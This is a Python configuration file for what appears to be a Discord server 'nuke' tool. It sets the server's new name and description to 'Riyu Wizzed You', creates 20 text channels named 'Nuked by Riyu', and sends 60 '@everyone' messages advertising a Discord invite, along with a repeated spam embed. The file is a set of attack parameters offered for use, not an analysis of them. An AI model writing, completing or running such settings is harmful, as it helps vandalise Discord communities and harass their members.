SERVER = {
    "new_name": "Riyu Wizzed You",  
    "new_description": "Riyu Wizzed You",  
}

WEBHOOK = {"name": "",}

FULL_NUKE = {
    'channel_number': 20,  
    'channel_type': 'text',   
    'channel_name': 'Nuked by Riyu',  
    'num_messages': 60,   
    'message_content': '@everyone nuked by https://discord.gg/fursat' 
}

EMBED = {
    "title": "Riyu Wizzed You",    
    "description": "Riyu Wizzed You",            
    "color": 0xFF5733,      
    "fields": [
        {"name": "Riyu Wizzed You", "value": "Riyu Wizzed You", "inline": False},     
        {"name": "Riyu Wizzed You", "value": "Riyu Wizzed You", "inline": False},
        {"name": "Riyu Wizzed You", "value": "Riyu Wizzed You", "inline": False},    
    ],
        "footer": "Riyu Wizzed You",     
}
